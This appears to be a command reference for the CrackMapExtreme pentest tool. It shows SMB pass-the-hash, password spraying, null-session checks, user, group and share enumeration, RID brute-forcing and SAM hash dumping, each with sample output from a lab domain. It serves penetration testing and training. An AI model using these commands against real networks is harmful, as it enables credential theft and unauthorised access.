# SMB: Command Execution Reference
Created by: @awsmhacks  
Updated: 8/21/19   
CMX Version: 5.0.1
  
This is a command reference guide and does not cover when or why 
you might want to use these examples.  
For explanation on this guides' format go to [CMX Docs Home](https://github.com/awsmhacks/CrackMapExtreme/blob/master/docs/CMX-Usage-Home.md)  
  
**Notes:**  
* The following examples assume you have a Kali Linux host connected to an internal network.    
* For the examples it is also assumed hosts are within a 10.10.33.0/24 IP space.   
* If CMX isnt giving output of anykind, you probably have something wrong with the command.   
-(better timeout messages and incorrect command format error messages are still a work-in-progress)  
 
  
Sections  
  
1. [Authentication / Checking Creds (Domain)](#authenticationdomain)  
2. [Authentication / Checking Creds (Local)](#authenticationlocal) 
3. [Mapping+Enum](#mappingenumeration)   
4. [Extracting Credentials](#extracting-credentials)  
5. [Spidering Shares](#spidering-shares)
6. [Interactive Shell Mode](#interactive-shell-mode)
7. [WMI Query Execution](#wmi-query-execution)  
8. [Raw Command Execution and changeing execution method](#command-execution)


------------------------------------------------------------------------
------------------------------------------------------------------------
# Authentication

## Authentication(Domain)
| Multiple_Host | Requires DC | Opsec_safe |
|---------------|-------------|------------|
| true          | false       | true*      |

Failed logins result in a [-]  
Successful logins result in a [+] followed by the Domain\Username:Password used.    
  
If the user has LocalAdmin privileges a (Pwn3d!) label is added after the login confirmation, shown below.  
This label can be changed in the config.py file.  

```
Aug.20.19 14:38:15  SMB         IP:PORT  HOSTNAME  [+] DOMAIN\username:password (Pwn3d!) 
```

------------------------------------------------------------------------
### User with Password

```
#~ cmx smb 10.10.33.123 -u agrande -p User\!23

Aug.20.19 14:42:43  SMB         10.10.33.123:445  10.10.33.123 [*] Windows 6.1 Build 7601 x64 (domain:OCEAN) (signing:True) (SMBv:2.1)
Aug.20.19 14:42:43  SMB         10.10.33.123:445  10.10.33.123 [+] OCEAN\agrande:User!23 (Pwn3d!)
```

------------------------------------------------------------------------
### User with Hash 

After obtaining credentials such as  
	agrande:1002:aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c:::  
you can use both the full hash or just the nt hash (second half)  
```
#~ cmx smb 10.10.33.123 -u username -H 'LM:NT'
#~ cmx smb 10.10.33.123 -u username -H 'NTHASH'
```
Spray an entire /24 subnet with a hash  
```
#~ cmx smb 10.10.33.0/24 -u agrande -H '13b29964cc2480b4ef454c59562e675c'
#~ cmx smb 10.10.33.0/24 -u agrande -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c'
```

If multiple domains are in use, you may need to specify the target domain using -d  
For example authenticating to the domain labnet.com (using all caps seems to be more reliable)  
```
#~ cmx smb 10.10.33.123 -u agrande -p User\!23 -d LABNET
```

------------------------------------------------------------------------
### Null Sessions

One interesting use-case is checking for null sessions over smb.  
Pass an empty user/password strings to the command.   
The [+] results indicate a success. 
```
#~ cmx smb 10.10.33.120-127 -u '' -p '' 

Aug.20.19 12:20:15  SMB         10.10.33.122:445  10.10.33.122 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 12:20:15  SMB         10.10.33.121:445  10.10.33.121 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 12:20:15  SMB         10.10.33.124:445  10.10.33.124 [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 12:20:15  SMB         10.10.33.122:445  10.10.33.122 [-] OCEAN\: STATUS_ACCESS_DENIED 
Aug.20.19 12:20:15  SMB         10.10.33.121:445  10.10.33.121 [+] OCEAN\: 
Aug.20.19 12:20:15  SMB         10.10.33.123:445  10.10.33.123 [*] Windows 6.1 Build 7601 x64 (domain:OCEAN) (signing:True) (SMBv:2.1)
Aug.20.19 12:20:15  SMB         10.10.33.125:445  10.10.33.125 [*] Windows 10.0 Build 17763 x64 (domain:OCEAN) (signing:False) (SMBv:3.0)
Aug.20.19 12:20:15  SMB         10.10.33.124:445  10.10.33.124 [+] OCEAN\: 
Aug.20.19 12:20:15  SMB         10.10.33.125:445  10.10.33.125 [-] OCEAN\: STATUS_ACCESS_DENIED 
Aug.20.19 12:20:15  SMB         10.10.33.123:445  10.10.33.123 [+] OCEAN\: 
Aug.20.19 12:20:21         [!] Could not connect to 10.10.33.127, no route to host. Can you ping it? [!]
Aug.20.19 12:20:21         [!] Could not connect to 10.10.33.126, no route to host. Can you ping it? [!]

```

------------------------------------------------------------------------
### Using Username and/or Password Lists

You can use multiple usernames or passwords by seperating the names/passwords with a space.
```
#~ cmx smb 10.10.33.123 -u user1 user2 user3 -p Summer18
#~ cmx smb 10.10.33.123 -u user1 -p password1 password2 password3
```
Example using multiple passwords:
```
#~ cmx smb 10.10.33.123 -u agrande -p password1 Spring19 User\!23

Aug.20.19 14:49:23  SMB         10.10.33.123:445  10.10.33.123 [*] Windows 6.1 Build 7601 x64 (domain:OCEAN) (signing:True) (SMBv:2.1)
Aug.20.19 14:49:23  SMB         10.10.33.123:445  10.10.33.123 [-] OCEAN\agrande:password1 STATUS_LOGON_FAILURE 
Aug.20.19 14:49:23  SMB         10.10.33.123:445  10.10.33.123 [-] OCEAN\agrande:Spring19 STATUS_LOGON_FAILURE 
Aug.20.19 14:49:23  SMB         10.10.33.123:445  10.10.33.123 [+] OCEAN\agrande:User!23 (Pwn3d!)
```

CMX also accepts files of usernames and passwords. One user/password per line.
Watch out for account lockout!  
```
#~ cmx smb 10.10.33.123 -u /path/to/users.txt -p Summer18
#~ cmx smb 10.10.33.0/24 -u Administrator -p /path/to/passwords.txt
```

Example using username list:
```
#~ cmx smb 10.10.33.123 -u userlist -p User\!23 
Aug.20.19 14:50:08  SMB         10.10.33.123:445  10.10.33.123 [*] Windows 6.1 Build 7601 x64 (domain:OCEAN) (signing:True) (SMBv:2.1)
Aug.20.19 14:50:08  SMB         10.10.33.123:445  10.10.33.123 [-] OCEAN\TestUser1:User!23 STATUS_LOGON_FAILURE 
Aug.20.19 14:50:08  SMB         10.10.33.123:445  10.10.33.123 [-] OCEAN\UserA:User!23 STATUS_LOGON_FAILURE 
Aug.20.19 14:50:08  SMB         10.10.33.123:445  10.10.33.123 [-] OCEAN\Administrator:User!23 STATUS_LOGON_FAILURE 

```

------------------------------------------------------------------------
### Keep spraying after success  

\*Note\*: By default CMX will exit after a successful login is found.
Using the --continue-on-success flag will continue spraying even after a 
valid password is found. Usefull for spraying a single password against a large user list  
Example:  
```
#~ cmx smb 10.10.33.123 -u doms -p User\!23 --continue-on-success 

Aug.20.19 14:56:43  SMB         10.10.33.123:445  10.10.33.123 [*] Windows 6.1 Build 7601 x64 (domain:OCEAN) (signing:True) (SMBv:2.1)
Aug.20.19 14:56:43  SMB         10.10.33.123:445  10.10.33.123 [-] OCEAN\ozzy:User!23 STATUS_ACCOUNT_LOCKED_OUT 
Aug.20.19 14:56:43  SMB         10.10.33.123:445  10.10.33.123 [-] OCEAN\mbellamy:User!23 STATUS_ACCOUNT_LOCKED_OUT 
Aug.20.19 14:56:43  SMB         10.10.33.123:445  10.10.33.123 [+] OCEAN\tswift:User!23 (Pwn3d!)
Aug.20.19 14:56:43  SMB         10.10.33.123:445  10.10.33.123 [-] OCEAN\tim:User!23 STATUS_ACCESS_DENIED 
Aug.20.19 14:56:43  SMB         10.10.33.123:445  10.10.33.123 [-] OCEAN\carol:User!23 STATUS_LOGON_FAILURE 
Aug.20.19 14:56:43  SMB         10.10.33.123:445  10.10.33.123 [-] OCEAN\eddy:User!23 STATUS_LOGON_FAILURE 
Aug.20.19 14:56:43  SMB         10.10.33.123:445  10.10.33.123 [+] OCEAN\agrande:User!23 (Pwn3d!)
Aug.20.19 14:56:43  SMB         10.10.33.123:445  10.10.33.123 [-] OCEAN\bob:User!23 STATUS_ACCESS_DENIED 
```

--------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------

# Authentication(Local)

| Multiple_Host | Requires DC | Opsec_safe |
|---------------|-------------|------------|
| true          | false       | true*      |

Adding --local-auth to any of the authentication commands will attempt to logon locally.  
  
```
#~ cmx smb 10.10.33.123 -u UserNAme -p 'PASSWORDHERE' --local-auth
#~ cmx smb 10.10.33.120-127 -u '' -p '' --local-auth
#~ cmx smb 10.10.33.0/24 -u UserNAme -H 'LM:NT' --local-auth
#~ cmx smb 10.10.33.123 -u UserNAme -H 'NTHASH' --local-auth
#~ cmx smb 10.10.33.123 -u localguy -H '13b29964cc2480b4ef454c59562e675c' --local-auth
#~ cmx smb 10.10.33.123 -u localguy -H 'aad3b435b51404eeaad3b435b51404ee:13b29964cc2480b4ef454c59562e675c' --local-auth
```
Results will display the hostname next to the user:password
```
#~ cmx smb 10.10.33.123 -u agrande -p User\!23 --local-auth

Aug.20.19 15:26:01  SMB         10.10.33.123:445  10.10.33.123 [*] Windows 6.1 Build 7601 x64 (domain:WIN7E-PC) (signing:True) (SMBv:2.1)
Aug.20.19 15:26:01  SMB         10.10.33.123:445  10.10.33.123 [-] WIN7E-PC\agrande:User!23 STATUS_LOGON_FAILURE 
```

--------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------

# Mapping/Enumeration

### Map network hosts

| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | false       | false       | true*      |

Returns the results of connection attempts over SMB.     
No creds required.    
Output includes the OS, Domain, SMB Signing status, SMB Version.  

Valid Execution:
```
#~ cmx smb 10.10.33.120-127
```
Expected Results:
```
#~ cmx smb 10.10.33.120-127

Aug.20.19 11:35:37  SMB         10.10.33.124:445  10.10.33.124 [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 11:35:37  SMB         10.10.33.122:445  10.10.33.122 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 11:35:37  SMB         10.10.33.121:445  10.10.33.121 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 11:35:37  SMB         10.10.33.123:445  10.10.33.123 [*] Windows 6.1 Build 7601 x64 (domain:OCEAN) (signing:True) (SMBv:2.1)
Aug.20.19 11:35:37  SMB         10.10.33.125:445  10.10.33.125 [*] Windows 10.0 Build 17763 x64 (domain:OCEAN) (signing:False) (SMBv:3.0)
Aug.20.19 11:22:58         [!] Could not connect to 10.10.33.126, no route to host. Can you ping it? [!]
Aug.20.19 11:22:58         [!] Could not connect to 10.10.33.120, no route to host. Can you ping it? [!]
Aug.20.19 11:22:58         [!] Could not connect to 10.10.33.127, no route to host. Can you ping it? [!]
```

------------------------------------------------------------------------
### Generate Relay List

| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | false       | false       | true*      |

Returns a list of the targets that dont require SMB signing.  
Output file format is one IP per line. (this is so it can be fed back to cmx for other commands)  
*Note: this one tends to hang a bit*   
Using the defaults (100 threads,10 second timeout) expect it to finish in a little over 1 min.   

Expected Results:
```
#~ cmx smb 10.10.33.120-127 --gen-relay-list unsignedTargets.txt

Aug.20.19 11:35:37  SMB         10.10.33.124:445  10.10.33.124 [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 11:35:37  SMB         10.10.33.122:445  10.10.33.122 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 11:35:37  SMB         10.10.33.121:445  10.10.33.121 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 11:35:37  SMB         10.10.33.123:445  10.10.33.123 [*] Windows 6.1 Build 7601 x64 (domain:OCEAN) (signing:True) (SMBv:2.1)
Aug.20.19 11:35:37  SMB         10.10.33.125:445  10.10.33.125 [*] Windows 10.0 Build 17763 x64 (domain:OCEAN) (signing:False) (SMBv:3.0)
Aug.20.19 11:22:58         [!] Could not connect to 10.10.33.126, no route to host. Can you ping it? [!]
Aug.20.19 11:22:58         [!] Could not connect to 10.10.33.120, no route to host. Can you ping it? [!]
Aug.20.19 11:22:58         [!] Could not connect to 10.10.33.127, no route to host. Can you ping it? [!]

#~ cat unsignedTargets.txt 
10.10.33.121
10.10.33.124
10.10.33.122
10.10.33.125
```

------------------------------------------------------------------------
### Enumerate shares and access

| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | false       | false       | true*      |

Attempts to authenticate to the target(s) and enumerate share access.

Example:  
```
#~ cmx smb 10.10.33.122-123 -u agrande -p User\!23 --shares 

Aug.20.19 12:14:46  SMB         10.10.33.122:445  10.10.33.122 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 12:14:46  SMB         10.10.33.123:445  10.10.33.123 [*] Windows 6.1 Build 7601 x64 (domain:OCEAN) (signing:True) (SMBv:2.1)
Aug.20.19 12:14:46  SMB         10.10.33.122:445  10.10.33.122 [+] OCEAN\agrande:User!23 
Aug.20.19 12:14:46         [!] Starting Share Enumeration [!]
Aug.20.19 12:14:46  SMB         10.10.33.123:445  10.10.33.123 [+] OCEAN\agrande:User!23 (Pwn3d!)
Aug.20.19 12:14:46         [!] Starting Share Enumeration [!]
Aug.20.19 12:14:46  SMB         10.10.33.122:445  10.10.33.122 Share           Permissions     Remark
Aug.20.19 12:14:46  SMB         10.10.33.122:445  10.10.33.122 -----           -----------     ------
Aug.20.19 12:14:46  SMB         10.10.33.122:445  10.10.33.122 ADMIN$                          Remote Admin
Aug.20.19 12:14:46  SMB         10.10.33.122:445  10.10.33.122 C$                              Default share
Aug.20.19 12:14:46  SMB         10.10.33.122:445  10.10.33.122 IPC$                            Remote IPC
Aug.20.19 12:14:46         [!] Finished Share Enumeration [!]
Aug.20.19 12:14:46  SMB         10.10.33.123:445  10.10.33.123 Share           Permissions     Remark
Aug.20.19 12:14:46  SMB         10.10.33.123:445  10.10.33.123 -----           -----------     ------
Aug.20.19 12:14:46  SMB         10.10.33.123:445  10.10.33.123 ADMIN$          READ,WRITE      Remote Admin
Aug.20.19 12:14:46  SMB         10.10.33.123:445  10.10.33.123 C$              READ,WRITE      Default share
Aug.20.19 12:14:46  SMB         10.10.33.123:445  10.10.33.123 IPC$                            Remote IPC
```
*try it with null user/passwords for null access. -u '' -p ''*  
  
------------------------------------------------------------------------
### Enumerate active sessions

| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | false       | false       | true*      |

Sessions are not the same as logged-on users.   

Example:  
```
#~ cmx smb 10.10.33.122-123 -u agrande -p User\!23 --sessions

Aug.20.19 14:32:36  SMB         10.10.33.123:445  10.10.33.123 [*] Windows 6.1 Build 7601 x64 (domain:OCEAN) (signing:True) (SMBv:2.1)
Aug.20.19 14:32:36  SMB         10.10.33.123:445  10.10.33.123 [+] OCEAN\agrande:User!23 (Pwn3d!)
Aug.20.19 14:32:36         [!] Starting Session Enum [!]
Aug.20.19 14:32:36  SMB         10.10.33.123:445  10.10.33.123 [+] Sessions enumerated on 10.10.33.123 !
Aug.20.19 14:32:36  SMB         10.10.33.123:445  10.10.33.123 [+] Sessions enumerated!
Aug.20.19 14:32:36  User: agrande has session originating from 10.10.33.200
Aug.20.19 14:32:56  SMB         10.10.33.122:445  10.10.33.122 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 14:32:56  SMB         10.10.33.122:445  10.10.33.122 [+] OCEAN\agrande:User!23 
Aug.20.19 14:32:56         [!] Starting Session Enum [!]
Aug.20.19 14:32:56  SMB         10.10.33.122:445  10.10.33.122 [+] Sessions enumerated on 10.10.33.122 !
Aug.20.19 14:32:56  SMB         10.10.33.122:445  10.10.33.122 [+] Sessions enumerated!
Aug.20.19 14:32:56  User: AGRANDE has session originating from 10.10.33.200


```

------------------------------------------------------------------------
### Enumerate logged on users

| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | false       | false       | true*      |

Logged-on users are not the same as sessions.    
  
Example:  
```
#~ cmx smb 10.10.33.123 -u agrande -p User\!23 --loggedon 

Aug.20.19 14:37:08  SMB         10.10.33.123:445  10.10.33.123 [*] Windows 6.1 Build 7601 x64 (domain:OCEAN) (signing:True) (SMBv:2.1)
Aug.20.19 14:37:08  SMB         10.10.33.123:445  10.10.33.123 [+] OCEAN\agrande:User!23 (Pwn3d!)
Aug.20.19 14:37:08         [!] Checking for logged on users [!]
Aug.20.19 14:37:08  SMB         10.10.33.123:445  10.10.33.123 [+] Loggedon-Users enumerated on 10.10.33.123 !
Aug.20.19 14:37:08  User:agrande is currently logged on 10.10.33.123
Aug.20.19 14:37:08  User:agrande is currently logged on 10.10.33.123
Aug.20.19 14:37:08  User:WIN7E-PC$ is currently logged on 10.10.33.123

```

------------------------------------------------------------------------
### Enumerate disks

| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | false       | false       | true*      |

Without local admin it will run, but probably not return anything.  
```
#~ cmx smb 10.10.33.123 -u agrande -p User\!23 --disks 

Aug.20.19 14:34:31  SMB         10.10.33.123:445  10.10.33.123 [*] Windows 6.1 Build 7601 x64 (domain:OCEAN) (signing:True) (SMBv:2.1)
Aug.20.19 14:34:31  SMB         10.10.33.123:445  10.10.33.123 [+] OCEAN\agrande:User!23 (Pwn3d!)
Aug.20.19 14:34:31         [!] Attempting to enum disks... [!]
Aug.20.19 14:34:31  SMB         10.10.33.123:445  10.10.33.123 [+] Disks enumerated on 10.10.33.123 !
Aug.20.19 14:34:31  Disk: C: found on 10.10.33.123
Aug.20.19 14:34:31  Disk: D: found on 10.10.33.123

```

------------------------------------------------------------------------
### Enumerate domain users

| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | false       | false       | true*      |


```
#~ cmx smb 10.10.33.123 -u agrande -p User\!23 -dc 10.10.33.100 --users

Aug.20.19 14:38:15  SMB         10.10.33.123:445  10.10.33.123 [*] Windows 6.1 Build 7601 x64 (domain:OCEAN) (signing:True) (SMBv:2.1)
Aug.20.19 14:38:15  SMB         10.10.33.123:445  10.10.33.123 [+] OCEAN\agrande:User!23 (Pwn3d!)
Aug.20.19 14:38:15         [!] Starting Domain Users Enum [!]
Aug.20.19 14:38:15  username: Administrator              rid: 500
Aug.20.19 14:38:16  username: Guest                      rid: 501
Aug.20.19 14:38:16  username: krbtgt                     rid: 502
Aug.20.19 14:38:16  username: agrande                    rid: 1104
Aug.20.19 14:38:16  username: ozzy                       rid: 1111
Aug.20.19 14:38:16  username: testuser                   rid: 1121
Aug.20.19 14:38:16  username: ringo                      rid: 1122
Aug.20.19 14:38:16  username: FdBChukYpb                 rid: 1123
Aug.20.19 14:38:16  username: mbellamy                   rid: 1125
Aug.20.19 14:38:16         [!] Finished Domain Users Enum [!]

```

------------------------------------------------------------------------
### Enumerate domain groups

| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | false       | false       | true*      |

```
#~ cmx smb 10.10.33.122 -u agrande -p User\!23 -dc 10.10.33.100 --groups

Aug.20.19 15:41:26  SMB         10.10.33.122:445  10.10.33.122 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 15:41:26  SMB         10.10.33.122:445  10.10.33.122 [+] OCEAN\agrande:User!23 
Aug.20.19 15:41:26         [!] Starting Domain Group Enum [!]
Aug.20.19 15:41:26  Groupname: Enterprise Read-only Domain Controllers  membercount: 0
Aug.20.19 15:41:26  Groupname: Domain Admins                   membercount: 2
Aug.20.19 15:41:26  Groupname: Domain Users                    membercount: 9
Aug.20.19 15:41:27  Groupname: Domain Guests                   membercount: 1
Aug.20.19 15:41:27  Groupname: Domain Computers                membercount: 9
Aug.20.19 15:41:27  Groupname: Domain Controllers              membercount: 1
Aug.20.19 15:41:27  Groupname: Schema Admins                   membercount: 1
Aug.20.19 15:41:27  Groupname: Enterprise Admins               membercount: 1
Aug.20.19 15:41:27  Groupname: Group Policy Creator Owners     membercount: 1
Aug.20.19 15:41:27  Groupname: Read-only Domain Controllers    membercount: 0
Aug.20.19 15:41:27  Groupname: Cloneable Domain Controllers    membercount: 0
Aug.20.19 15:41:27  Groupname: Protected Users                 membercount: 0
Aug.20.19 15:41:27  Groupname: DnsUpdateProxy                  membercount: 0
Aug.20.19 15:41:27  Groupname: Servers                         membercount: 4
Aug.20.19 15:41:27  Groupname: Desktops                        membercount: 5
Aug.20.19 15:41:27  Groupname: Server Admins                   membercount: 1
Aug.20.19 15:41:27  Groupname: Desktop Admins                  membercount: 2

```

------------------------------------------------------------------------
### Enumerate Specific domain group

| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | false       | false       | true*      |
  
Enum Domain Admins and Domain Controllers:  
```
#~ cmx smb 10.10.33.122 -u agrande -p User\!23 --group "Domain Admins"

Sep.02.19 13:18:42  SMB         10.10.33.125:445  WIN10E  [*] Windows 10.0 Build 17763 x64 (domain:OCEAN) (signing:False) (SMBv:3.0)
Sep.02.19 13:18:42  SMB         10.10.33.125:445  WIN10E  [+] OCEAN\Administrator:AdminSuper!23 (Pwn3d!)
Sep.02.19 13:18:42  SMB         10.10.33.125:445  WIN10E  [+] Domain Groups enumerated
Sep.02.19 13:18:42  SMB         10.10.33.125:445  WIN10E  [+] "Domain Admins" Domain Group Found in OCEAN
Sep.02.19 13:18:42  SMB         10.10.33.125:445  WIN10E      "Domain Admins" Group Info
Sep.02.19 13:18:42  SMB         10.10.33.125:445  WIN10E  Member Count: 2
Sep.02.19 13:18:42  SMB         10.10.33.125:445  WIN10E  OCEAN\Administrator                   
Sep.02.19 13:18:42  SMB         10.10.33.125:445  WIN10E  OCEAN\mbellamy


#~ cmx smb 10.10.33.104 -u Administrator -p AdminSuper\!23 --group "Domain Controllers"
Sep.02.19 14:25:46  SMB         10.10.33.104:445  DESKTOP-HVIF7F2 [*] Windows 10.0 Build 18362 x64 (domain:OCEAN) (signing:False) (SMBv:3.0)
Sep.02.19 14:25:46  SMB         10.10.33.104:445  DESKTOP-HVIF7F2 [+] OCEAN\Administrator:AdminSuper!23 (Pwn3d!)
Sep.02.19 14:25:46  SMB         10.10.33.104:445  DESKTOP-HVIF7F2 [+] Domain Groups enumerated
Sep.02.19 14:25:46  SMB         10.10.33.104:445  DESKTOP-HVIF7F2 [+] "Domain Controllers" Domain Group Found in OCEAN
Sep.02.19 14:25:46  SMB         10.10.33.104:445  DESKTOP-HVIF7F2     "Domain Controllers" Group Info
Sep.02.19 14:25:46  SMB         10.10.33.104:445  DESKTOP-HVIF7F2 Member Count: 1
Sep.02.19 14:25:46  SMB         10.10.33.104:445  DESKTOP-HVIF7F2 OCEAN\DC2012-A$     

```

------------------------------------------------------------------------
### Enumerate local users

| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | false       | false       | true*      |

```
#~ cmx smb 10.10.33.122 -u agrande -p User\!23 --local-users

Aug.20.19 15:42:54  SMB         10.10.33.122:445  10.10.33.122 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 15:42:54  SMB         10.10.33.122:445  10.10.33.122 [+] OCEAN\agrande:User!23 
Aug.20.19 15:42:54         [!] Checking Local Users [!]
Aug.20.19 15:42:54  username: Administrator              rid: 500
Aug.20.19 15:42:54  username: Guest                      rid: 501
Aug.20.19 15:42:54         [!] Finished Checking Local Users [!]
```

------------------------------------------------------------------------
### Enumerate local users by bruteforcing RID

| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | false       | false       | true*      |

```
#~ cmx smb 10.10.33.122 -u agrande -p User\!23 --rid-brute

Aug.20.19 15:42:11  SMB         10.10.33.122:445  10.10.33.122 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 15:42:11  SMB         10.10.33.122:445  10.10.33.122 [+] OCEAN\agrande:User!23 
Aug.20.19 15:42:11         [!] Starting RID Brute [!]
Aug.20.19 15:42:12  SMB         10.10.33.122:445  10.10.33.122 500: SERVER2012-2\Administrator (SidTypeUser)
Aug.20.19 15:42:12  SMB         10.10.33.122:445  10.10.33.122 501: SERVER2012-2\Guest (SidTypeUser)
Aug.20.19 15:42:12  SMB         10.10.33.122:445  10.10.33.122 513: SERVER2012-2\None (SidTypeGroup)
Aug.20.19 15:42:12  SMB         10.10.33.122:445  10.10.33.122 1000: SERVER2012-2\WinRMRemoteWMIUsers__ (SidTypeAlias)
Aug.20.19 15:42:13         [!] Finished RID brute [!]
```

------------------------------------------------------------------------
### Enumerate local groups

| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | false       | false       | true*      |

```
#~ cmx smb 10.10.33.122 -u agrande -p User\!23 --local-groups

Aug.20.19 15:44:07  SMB         10.10.33.122:445  10.10.33.122 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 15:44:07  SMB         10.10.33.122:445  10.10.33.122 [+] OCEAN\agrande:User!23 
Aug.20.19 15:44:07         [!] Checking Local Groups [!]
Aug.20.19 15:44:07  SMB         10.10.33.122:445  10.10.33.122 [*] Looking up groups on: SERVER2012-2
Aug.20.19 15:44:07  Groupname: None                            membercount: 2
Aug.20.19 15:44:07         [!] Finished Checking Local Groups [!]
```

------------------------------------------------------------------------
### Obtain password policy

| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | false       | false       | true*      |

```
#~ cmx smb 10.10.33.122 -u agrande -p User\!23 --pass-pol

Sep.02.19 14:04:40  SMB         10.10.33.122:445  SERVER2012-2 [*] Windows Server 2012 R2 Datacenter 9600 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Sep.02.19 14:04:40  SMB         10.10.33.122:445  SERVER2012-2 [+] OCEAN\agrande:User!23 
Sep.02.19 14:04:40  SMB         10.10.33.122:445  SERVER2012-2 [+] Dumping password info for domain: OCEAN
Sep.02.19 14:04:40  SMB         10.10.33.122:445  SERVER2012-2 Minimum password length: 7
Sep.02.19 14:04:40  SMB         10.10.33.122:445  SERVER2012-2 Password history length: 24
Sep.02.19 14:04:40  SMB         10.10.33.122:445  SERVER2012-2 Maximum password age: 
Sep.02.19 14:04:40  SMB         10.10.33.122:445  SERVER2012-2 Minimum password age: 
Sep.02.19 14:04:40  SMB         10.10.33.122:445  SERVER2012-2 Reset Account Lockout Counter: 30 minutes 
Sep.02.19 14:04:40  SMB         10.10.33.122:445  SERVER2012-2 Locked Account Duration: 30 minutes 
Sep.02.19 14:04:40  SMB         10.10.33.122:445  SERVER2012-2 Account Lockout Threshold: 3
Sep.02.19 14:04:40  SMB         10.10.33.122:445  SERVER2012-2 Forced Log off Time: Not Set

```

--------------------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------------------

# Extracting Credentials

Output for cred dumping commands are saved to the logs folder.   
Exact location is mentioned after the command.     


For reasons i have yet to determine, you cant use --sam and --lsa together.  
Secrets dump dont like it.  
  
### \*Dump SAM hashes using methods from secretsdump.py 

| Multiple_Host | Requires DC | Requires LA | Requires DA | Opsec_safe |
|---------------|-------------|-------------|-------------|------------|
| true          | false       | true        | false       | true*      |

```
#~  cmx smb 10.10.33.123-124 -u agrande -p User\!23 --sam

Aug.20.19 15:55:28  SMB         10.10.33.124:445  10.10.33.124 [*] Windows 7 Ultimate 7601 Service Pack 1 x64 (domain:OCEAN) (signing:False) (SMBv:1)
Aug.20.19 15:55:28  SMB         10.10.33.123:445  10.10.33.123 [*] Windows 6.1 Build 7601 x64 (domain:OCEAN) (signing:True) (SMBv:2.1)
Aug.20.19 15:55:28  SMB         10.10.33.124:445  10.10.33.124 [+] OCEAN\agrande:User!23 (Pwn3d!)
Aug.20.19 15:55:28         [!] Dumping SAM hashes [!]
Aug.20.19 15:55:28  SMB         10.10.33.123:445  10.10.33.123 [+] OCEAN\agrande:User!23 (Pwn3d!)
Aug.20.19 15:55:28         [!] Dumping SAM hashes [!]
Aug.20.19 15:55:30  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Aug.20.19 15:55:30  Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Aug.20.19 15:55:30  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Aug.20.19 15:55:30  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Aug.20.19 15:55:30  Win7P:1000:aad3b435b51404eeaad3b435b51404ee:7ef966657ac6efcd0692cef758f4deb9:::
Aug.20.19 15:55:30         [!] Added 3 SAM hashes to the database [!]
